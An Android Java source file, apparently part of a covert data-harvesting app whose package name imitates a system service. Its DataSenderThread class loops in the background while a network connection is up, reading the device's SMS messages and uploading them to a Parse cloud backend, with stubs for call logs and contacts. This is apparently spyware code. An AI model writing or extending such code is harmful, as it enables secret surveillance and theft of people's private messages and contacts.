package com.android.service_getdata.Threads;

import android.content.ContentResolver;

import com.android.service_getdata.Helper.HelperClass;
import com.android.service_getdata.parsehandling.SaveSMSToParse;
import com.parse.ParseObject;

/**
 * Created by inrsharm04 on 7/15/2015.
 */
public class DataSenderThread extends Thread {

    ContentResolver mContentResolver;
    private int mCurrentThread;
    SaveSMSToParse mSaveSMSToParse;
    public static final int SMS_THREAD = 1;
    public static final int CALLLOGS_THREAD = 2;
    public static final int CONTACT_THREAD = 3;

    public DataSenderThread(ContentResolver contentResolver, int type) {
        mContentResolver = contentResolver;
        mCurrentThread = type;
        if (mCurrentThread == SMS_THREAD)
            mSaveSMSToParse = new SaveSMSToParse(contentResolver);
    }
    @Override
    public void run() {
        try{
            while (true){

                if (!HelperClass.isInternetAvailable())
                    return;

                switch (mCurrentThread){
                    case SMS_THREAD:
                        mSaveSMSToParse.fetchSMSDataFromDB();
                        if (!mSaveSMSToParse.isContinue)
                            return;
                        mSaveSMSToParse.sendDataToParse();
                        break;
                    case CALLLOGS_THREAD:
                        break;
                    case CONTACT_THREAD:
                        break;
                    default:
                        break;
                }
            }

        }
        catch (Exception exc){
            exc.printStackTrace();
        }
    }
}
